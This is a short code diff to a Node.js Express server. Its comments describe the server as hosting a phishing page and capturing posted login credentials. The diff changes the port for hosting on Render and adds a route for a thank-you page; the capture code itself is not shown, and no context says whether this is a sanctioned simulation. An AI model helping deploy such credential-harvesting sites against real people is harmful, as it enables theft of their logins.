@@ -3,7 +3,9 @@ const bodyParser = require('body-parser');
 const path = require('path');
 
 const app = express();
-const port = 3000;
+
+// Use environment port if available (for Render), fallback to 3000 locally
+const port = process.env.PORT || 3000;
 
 // Middleware to parse URL-encoded form data
 app.use(bodyParser.urlencoded({ extended: false }));
@@ -22,6 +24,11 @@ app.get('/click', (req, res) => {
 
 // Serve static files (your phishing page and thankyou page) from 'public' folder
 app.use(express.static(path.join(__dirname, 'public')));
+
+// Explicit route for thankyou page to ensure it is served
+app.get('/thankyou.html', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'thankyou.html'));
+});
 
 // Endpoint to capture POSTed credentials
 app.post('/login', (req, res) => {
